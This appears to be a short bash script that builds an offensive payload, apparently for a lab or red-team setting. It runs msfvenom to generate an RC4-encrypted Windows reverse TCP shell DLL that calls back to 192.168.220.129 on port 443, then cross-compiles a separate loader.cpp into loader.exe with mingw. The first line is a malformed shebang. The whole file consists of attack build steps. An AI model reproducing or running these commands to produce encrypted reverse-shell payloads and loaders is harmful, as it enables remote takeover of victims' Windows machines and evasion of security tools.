$!/bin/bash

# payload
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.220.129 LPORT=443 --encrypt rc4 --encrypt-key johnnyb -f dll -o shellcode.dll

# compile loader
i686-w64-mingw32-g++ loader.cpp  -o loader.exe -static-libgcc -static-libstdc++